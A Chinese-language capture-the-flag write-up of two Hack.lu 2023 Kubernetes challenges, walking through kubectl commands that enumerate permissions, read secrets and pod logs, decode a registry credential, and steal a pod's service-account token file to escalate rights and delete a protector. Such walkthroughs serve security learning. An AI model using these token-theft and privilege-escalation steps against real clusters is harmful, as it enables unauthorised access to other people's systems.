# 2023-Hack.lu

看到有这两道题的时候环境已经关了，看了一下wp发现都是很常见的知识点，简单记录一下。

## Bat Kube

查看权限：

```bash
kubectl auth can-i --list  --kubeconfig config
```



flag由三部分组成，第一部分flag在secret中，同时里面有hint提示namespace

```bash
kubectl get secret kube-baby-flag-part1-of-3 -o json
```



```bash
kubectl get namespaces
kubectl get -n secret-namespace pods
kubectl -n secret-namespace describe pod kube-baby-flag-part2-of-3-6b97f47974-l4m4c

...
    Command:
      /bin/sh
    Args:
      -c
      while true; do printenv FLAG FLAG_HINT; sleep 300; done
```

因此查看log即可获得这部分flag：

```bash
kubectl -n secret-namespace logs  kube-baby-flag-part2-of-3-6b97f47974-l4m4c
r34lly_fun_but
What about Flags in the Kubernetes API?
```

第三部分hint是`Kubernetes API`，有一个命令可以查看k8s的api：

```bash
kubectl api-resources
flags         ctf.fluxfingers.hack.lu/v1             true         Flag
```

然后获取flag即可：

```bash
kubectl -n secret-namespace get flags
kubectl -n secret-namespace describe flags kube-baby-flag-part3-of-3

```



## Bat As Kube

先看权限

```bash
kubectl auth can-i --list --kubeconfig config
...
flagrequests.*                                  []                                     []                   [get list watch create delete]
flags.*                                         []                                     []                   [get list watch delete]
customresourcedefinitions.*                     []                                     []                   [get list watch]
flagprotectors.*                                []                                     []                   [get list watch]
secrets.*                                       []                                     [docker-hub-login]   [get list watch]

...
```

先看secret里面的docker-hub-login，给了镜像仓库的login cred，解码出来是：

```json
{
    "auths": {
        "git.k8s-ctf.de:1337": {
            "auth": "Y3RmLXBsYXllcjpmMV96WnNKdVN3M3Y2eTdGWHBucA=="
        }
    }
}

ctf-player:f1_zZsJuSw3v6y7FXpnp
```

登录后查看镜像：

```bash
docker login git.k8s-ctf.de:1337 

#describe，发现pod里面使用了git.k8s-ctf.de:1337/root/hacklu:latest镜像，运行了flag-operator.py
kubectl describe pod flag-operator-57547585c6-f6689

```

将镜像pull下来后本地启动，查看一下`flag-operator.py`：

```python
from kubernetes import client, config, watch
import os
import uuid
import json

def read_flag():
    flag = os.getenv("FLAG")
    return str(flag)

def check_flagrequest(obj, crds, group, version, flagprotector_plural):
    fp = crds.list_namespaced_custom_object(group, version, "flagprotector", flagprotector_plural)
    if len(fp["items"]) > 0:
        return False, "A Flagprotector is deployed somewhere in the cluster, you need to delete it first!"

    fr = json.loads(json.dumps(obj))

    if "metadata" not in fr.keys():
        return False, "Flagrequest: Missing metadata"

    if "labels" not in fr["metadata"].keys():
        return False, "Flagrequest: Missing labels"

    if "hack.lu/challenge-name" not in fr["metadata"]["labels"].keys():
        return False, "Flagrequest: Missing label hack.lu/challenge-name"

    if "give-flag" != fr["metadata"]["name"]:
        return False, "Flagrequest: I dont like the request name, it should be 'give-flag'"

    if "spec" not in fr.keys():
        return False, "Flagrequest: Missing spec"

    if "anti-bruteforce" not in fr["spec"].keys():
        return False, "Flagrequest: 'anti-bruteforce' is missing in the spec"

    if "Bi$wmX4PBTQLGe%AIKPO19$ussap4w" != fr["spec"]["anti-bruteforce"]:
        return False, "Flagrequest: Anti-bruteforce token invalid! You dont need to bruteforce! Im hiding something in the cluster, that will help you :D"

    return True, "Good Job!"

def main():
    # Define CRDs
    version = "v1"
    group = "ctf.fluxfingers.hack.lu"

    flagrequest_plural = "flagrequests"

    flagprotector_plural = "flagprotectors"

    flag_kind = "Flag"
    flag_plural = "flags"


    # Load CRDs
    crds = client.CustomObjectsApi()

    while True:
        print("Watching for flagrequests...")
        stream = watch.Watch().stream(crds.list_namespaced_custom_object, group, version, "default", flagrequest_plural)

        for event in stream:
            t = event["type"]
            flagrequest = event["object"]

            # Check if flagrequest was added
            if t == "ADDED":

                # Check if flagrequest is valid
                accepted, error = check_flagrequest(flagrequest, crds, group, version, flagprotector_plural)
                id = uuid.uuid4()
                if accepted:
                    print("Flagrequest accepted, creating flag...")
                    # Create flag
                    crds.create_namespaced_custom_object(group, version, "default", flag_plural, {
                        "apiVersion": group + "/" + version,
                        "kind": flag_kind,
                        "metadata": {
                            "name": "flag" + str(id)
                        },
                        "spec": {
                            "flag": read_flag(),
                            "error": str(error),
                        }
                    })
                else:
                    print("Flagrequest invalid")
                    # Create flag error
                    crds.create_namespaced_custom_object(group, version, "default", flag_plural, {
                        "apiVersion": group + "/" + version,
                        "kind": flag_kind,
                        "metadata": {
                            "name": "flag" + str(id)
                        },
                        "spec": {
                            "error": str(error),
                        }
                    })

if __name__ == "__main__":
    print("Starting operator...")
    try:
        config.incluster_config.load_incluster_config()
    except:
        print("Failed to load incluster config")
        exit(1)
    main()
```

代码的逻辑会一直检测`default`下的`flagrequests`，当新增`flagrequests`的时候，进行`check_flagrequest`，首先检测有没有`flagprotector`，有的话就不行。然后就是检查这个新增的`flagrequests`的各种属性等是否满足要求，满足要求就会执行下面的命令：

```python
                    crds.create_namespaced_custom_object(group, version, "default", flag_plural, {
                        "apiVersion": group + "/" + version,
                        "kind": flag_kind,
                        "metadata": {
                            "name": "flag" + str(id)
                        },
                        "spec": {
                            "flag": read_flag(),
                            "error": str(error),
                        }
                    })
```

创建一个新的`Flag`，将flag写到里面。



因此要先删除`flagprotector`，但是我们目前不能删除`flagprotector`。猜测这个Pod里的sa有权限删除，读取token：

```bash
$ token=$(kubectl -n flagprotector exec -it flagprotector-controller-5699c96f4-8fj5j -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

再查看权限，发现可以删除了：

```bash
kubectl --token $token auth can-i --list -n flagprotector
flagprotectors.*                                []                                     []               [get list watch delete]

kubectl --token $token -n flagprotector delete flagprotectors flag-protection 
```

删除完之后就是创建新的`flagrequests`：

```yaml
apiVersion: ctf.fluxfingers.hack.lu/v1
kind: Flagrequest
metadata:
  name: give-flag
  namespace: default
  labels:
    hack.lu/challenge-name: give-flag
spec:
    anti-bruteforce: "Bi$wmX4PBTQLGe%AIKPO19$ussap4w"
```

创建后读取flag：

```bash
kubectl apply -f Flagrequest.yaml
kubectl get flags
```

